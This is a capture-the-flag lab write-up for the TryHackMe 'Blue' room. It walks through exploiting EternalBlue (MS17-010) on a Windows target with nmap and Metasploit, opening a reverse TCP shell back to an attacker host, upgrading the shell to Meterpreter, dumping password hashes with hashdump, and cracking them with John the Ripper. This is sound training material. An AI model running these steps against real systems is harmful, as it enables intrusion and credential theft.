### Overview

Blue is a beginner-friendly room on TryHackMe that walks through exploiting a Windows machine vulnerable to MS17-010 (EternalBlue), one of the most notorious SMB vulnerabilities ever disclosed, famously weaponized in the WannaCry ransomware attacks of 2017. The room covers four core phases: Reconnaissance, Gaining Access, Privilege Escalation, and Post-Exploitation (credential cracking + flag retrieval).

#### Phase 1: Reconnaissance

Started with a service and version scan against the target to enumerate open ports and identify running services:

`nmap -sV -A -p- 10.112.178.43`

**Flag breakdown:**

- `sV` - probe open ports to determine service/version info
- `A` - aggressive scan (OS detection, version detection, script scanning, traceroute)
- `-p-` - scan all 65535 ports

<img width="1549" height="449" alt="image" src="https://github.com/user-attachments/assets/4c554908-b568-4063-bfba-bbbc21b449b2" />


#### Phase 2: Gaining Access


With the open ports identified, a quick search against the service versions revealed the machine is vulnerable to **MS17-010**, a critical Remote Code Execution vulnerability in Windows SMBv1, also known as EternalBlue.

<img width="1453" height="760" alt="image" src="https://github.com/user-attachments/assets/a73aa5ea-e6c3-4ec6-b441-31b81c987015" />

Launched msfconsole to exploit the identified vulnerability:

```
msfconsole
search ms17-010
use exploit/windows/smb/ms17_010_eternalblue
``` 

<img width="1747" height="795" alt="image" src="https://github.com/user-attachments/assets/0f43ccc4-2f86-422c-ae2a-607913a1ff36" />

Reviewed the required options and configured the target and attacker addresses:

```
show options
set RHOSTS 10.112.178.43
set LHOST <attacker-IP>
set payload windows/x64/shell/reverse_tcp
```

<img width="1702" height="649" alt="image" src="https://github.com/user-attachments/assets/34ab6fba-d39b-4671-a623-0414f980554d" />

With all options set, ran the exploit:

`exploit`

<img width="1652" height="541" alt="image" src="https://github.com/user-attachments/assets/12dae57c-67c8-4623-a8a3-324908116e7e" />

Initial access granted. The session opened as a basic Windows command shell.

#### Phase 3: Privilege Escalation - Shell to Meterpreter

The initial shell returned was a standard Windows shell - functional, but limited compared to a full Meterpreter session. The objective here was to upgrade it.

Used the following post-exploitation module to convert the active shell session to a Meterpreter session:

```
background
use post/multi/manage/shell_to_meterpreter
set SESSION <session-id>
run
```

<img width="1498" height="270" alt="image" src="https://github.com/user-attachments/assets/dbdb6fae-4565-4334-a9ca-c5a486914384" />


With the Meterpreter session active, listed all running processes on the target:

`ps`

Identified a suitable process running under `NT AUTHORITY\SYSTEM` and migrated into it to stabilize the session and ensure SYSTEM-level privileges persisted.

`migrate <PID>`


<img width="1658" height="930" alt="image" src="https://github.com/user-attachments/assets/df7bc2a8-ccfe-4ada-a55b-e393ef9d46fe" />


#### Phase 4: Cracking - Credential Dumping

Operating within the elevated Meterpreter shell, ran hashdump to dump all local account password hashes from the machine:

`hashdump`


The non-default user Jon was identified in the output. Copied Jon's NTLM password hash and cracked it offline using John the Ripper with the rockyou.txt wordlist:

`john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`

<img width="947" height="195" alt="image" src="https://github.com/user-attachments/assets/b50b314d-31a0-43cd-b6f4-b2e23d90499d" />

Password successfully recovered.

#### Phase 5: Flags

**Flag 1 - System Root**

The first flag was located at the root of the filesystem - the most accessible location, requiring only an active session to retrieve:

<img width="956" height="638" alt="image" src="https://github.com/user-attachments/assets/6998efca-a4db-416b-b11d-42ddee3a3329" />

**Flag 2 - Windows Password Store**

Researched where Windows stores its local password and SAM database. The path C:\Windows\System32\config is where Windows keeps its credential store - and unsurprisingly, that's exactly where the second flag was hidden:

`C:\Windows\System32\config\flag2.txt`

<img width="949" height="684" alt="image" src="https://github.com/user-attachments/assets/774b8181-dfe7-4b75-8da1-8d7b3994d1eb" />


**Flag 3 - User Documents**

The final flag was stored in the Documents folder under Jon's user profile - a location that mirrors where sensitive user data would realistically be found on a compromised endpoint:

`C:\Users\Jon\Documents\flag3.txt`

<img width="930" height="327" alt="image" src="https://github.com/user-attachments/assets/67380f02-b88d-4a4b-ba94-bef95fa86dac" />

### Conclusion

EternalBlue remains relevant. MS17-010 was patched in 2017, but unpatched Windows systems - particularly in legacy enterprise and OT/ICS environments - remain genuinely vulnerable to this day.
